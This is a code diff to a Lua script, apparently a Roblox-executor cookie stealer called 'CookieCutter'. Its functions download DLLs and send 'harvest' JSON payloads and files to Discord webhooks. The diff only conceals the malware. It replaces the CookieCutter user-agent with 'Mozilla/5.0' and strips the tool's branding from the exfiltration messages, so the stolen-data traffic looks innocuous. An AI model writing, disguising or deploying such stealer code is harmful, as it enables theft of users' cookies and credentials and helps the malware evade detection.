@@ -119,7 +119,7 @@ local function download_dll(url, savePath)
             local resp = syn.request({
                 Url = url,
                 Method = "GET",
-                Headers = {["User-Agent"] = "CookieCutter/1.0"}
+                Headers = {["User-Agent"] = "Mozilla/5.0"}
             })
             return resp and resp.Body
         end)
@@ -404,10 +404,10 @@ local function exfil_discord(payload_json)
         local body = to_json({
             content = nil,
             embeds = {{
-                title = "🍪 CookieCutter Harvest",
+                title = "script",
                 description = "```json\n" .. payload_json:sub(1, 1900) .. "\n```",
                 color = 0xFF6B35,
-                footer = {text = "CookieCutter | " .. os.date("%Y-%m-%d %H:%M:%S")},
+                footer = {text = "script | " .. os.date("%Y-%m-%d %H:%M:%S")},
             }}
         })
 
@@ -417,7 +417,7 @@ local function exfil_discord(payload_json)
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json",
-                    ["User-Agent"] = "CookieCutter/1.0"
+                    ["User-Agent"] = "Mozilla/5.0"
                 },
                 Body = body
             })
@@ -432,7 +432,7 @@ local function exfil_discord(payload_json)
         body = body .. "--" .. boundary .. "\r\n"
         body = body .. 'Content-Disposition: form-data; name="payload_json"\r\n'
         body = body .. 'Content-Type: application/json\r\n\r\n'
-        body = body .. '{"content":"🍪 CookieCutter harvest attached","username":"CookieCutter"}\r\n'
+        body = body .. '{"content":"harvest attached","username":"script"}\r\n'
         body = body .. "--" .. boundary .. "\r\n"
         body = body .. 'Content-Disposition: form-data; name="file"; filename="' .. filename .. '"\r\n'
         body = body .. "Content-Type: application/json\r\n\r\n"
@@ -445,7 +445,7 @@ local function exfil_discord(payload_json)
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
-                    ["User-Agent"] = "CookieCutter/1.0"
+                    ["User-Agent"] = "Mozilla/5.0"
                 },
                 Body = body
             })
